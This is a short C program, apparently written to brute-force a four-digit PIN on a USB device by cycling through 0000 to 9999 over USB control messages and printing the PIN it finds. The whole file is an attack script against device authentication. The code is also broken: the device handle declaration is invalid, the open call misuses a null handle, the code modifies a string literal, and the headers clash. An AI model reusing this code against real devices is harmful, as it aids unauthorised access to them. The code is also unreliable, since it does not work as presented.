#include<stdio.h> 
#include<stdlib.h>
 #include<string.h>
 #include<unistd.h> 
 #include<windows.h>
 #include<dos.h>
#include<conio.h>
 int main() 
{
char usb_dev_handle *device[] = NULL;
 int i;
char *password = "0000";
 int max_attempts = 9999; 
// Connect to the USB device 
device = usb_open(device); 
if(device == NULL)
 {
 printf("Failed to connect to USB device.\n"); 
return -1; 
} // Brute force the password
 for (i = 0; i < max_attempts; i++) 
{ // Send the current password 
usb_control_msg(device, 0x40, 0x01, 0, 0, password, 4, 0); 
// Check if the password is correct 
int result = usb_control_msg(device, 0xC0, 0x02, 0, 0, password, 4, 0); 
if (result == 0)
 { 
printf("Password found: %s\n", password); 
break; 
} // Increment the password 
int j; 
for (j = 3; j >= 0; j--) 
{ 
char c = password[j];
 if (c == '9') 
{
 password[j] = '0';
 }
 else
 {
 password[j]++; 
break; 
}
 }
 } // Close the connection 
usb_close(device); 
return 0;
 }
